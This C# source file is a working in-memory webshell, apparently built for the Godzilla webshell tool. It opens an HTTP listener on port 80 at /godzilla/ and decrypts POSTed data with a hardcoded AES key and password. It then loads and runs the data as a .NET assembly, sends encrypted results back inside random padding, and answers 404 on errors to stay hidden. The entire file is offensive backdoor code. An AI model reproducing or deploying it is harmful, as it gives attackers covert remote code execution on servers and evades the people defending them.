using System;
using System.Collections.Specialized;
using System.IO;
using System.Text;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Web;

//Support for .net Framework 2.0 - all connections when using the httpListenerURL binding route
public class HttpListenerMemoryShell
{
    public static string httpListenerURL = "http://*:80/godzilla/";
    public string password = "pass";
    public string key = "3c6e0b8a9c15224a";
    public static bool load;
    private Random rd = new Random();


    static HttpListenerMemoryShell(){
        if (!load)
        {
            //If it's a separate application, you don't have to create a new thread, you can call it directly in the Main method
            try
            {
                HttpListener listener = null;
                if (!HttpListener.IsSupported) { return; }
                listener = new HttpListener();
                listener.Prefixes.Add(httpListenerURL);
                listener.Start();
                new Thread(new ParameterizedThreadStart(new HttpListenerMemoryShell().Run)).Start(listener);
                load= true;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

        }
    }

    public HttpListenerMemoryShell()
    {

    }
    private void Run(object listenerobj)
    {
        HttpListener listener = (HttpListener)listenerobj;
        try
        {

            Assembly payload = null;
            while (true)
            {
                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest Request = context.Request;
                HttpListenerResponse Response = context.Response;
                StreamWriter ResponseStream = new StreamWriter(Response.OutputStream);
                try
                {
                    try
                    {
                        NameValueCollection RequestFrom = null;
                        if (Request.InputStream != null && Request.HttpMethod != "GET" && Request.ContentType.StartsWith("application/x-www-form-urlencoded"))
                        {
                            RequestFrom = System.Web.HttpUtility.ParseQueryString(new StreamReader(Request.InputStream).ReadToEnd());
                        }
                        else
                        {
                            RequestFrom = new NameValueCollection();
                        }

                        string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(password + key))).Replace("-", "");
                        byte[] data = System.Convert.FromBase64String(RequestFrom[password]);
                        data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
                        if (payload == null)
                        {
                            payload = (Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                        }
                        else
                        {
                            object o = payload.CreateInstance("LY");
                            System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                            o.Equals(outStream);
                            o.Equals(data);
                            o.ToString();
                            byte[] r = outStream.ToArray();
                            if (r.Length > 0)
                            {
                                outStream.Dispose();

                                ResponseStream.Write(GenerateRandomString(rd.Next(5, 50)));
                                ResponseStream.Write(md5.Substring(0, 16));
                                string ret = System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length));
                                ResponseStream.Write(ret);
                                ResponseStream.Write("1");
                                ResponseStream.Write("3");
                                ResponseStream.Write(md5.Substring(16));
                                ResponseStream.Write(GenerateRandomString(rd.Next(10, 60)));
                                Response.StatusCode = 200;
                            }
                            else {
                                throw new Exception();
                            }
                        }
                    }
                    catch (Exception)
                    {
                        Response.StatusCode = 404;
                    }
                }
                catch (Exception)
                {
                    Response.StatusCode = 404;
                }
                finally
                {
                    ResponseStream.Flush();
                    ResponseStream.Close();
                    Response.Close();
                }
            }
        }
        catch (Exception)
        {
            listener.Abort();
            listener.Close();
        }
        load = false;
    }

    public static string GenerateRandomString(int length)
    {
        char[] constant = new char[0x7e - 0x20];

        for (int i = 0; i < constant.Length; i++)
        {
            constant[i] = (char)(i + 0x20);
        }
        StringBuilder sb = new StringBuilder();
        byte[] b = new byte[4];
        new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
        Random rd = new Random(BitConverter.ToInt32(b, 0));
        for (int i = 0; i < length; i++)
        {
            sb.Append(constant[rd.Next(constant.Length - 1)].ToString());
        }
        return sb.ToString(); ;
    }
}
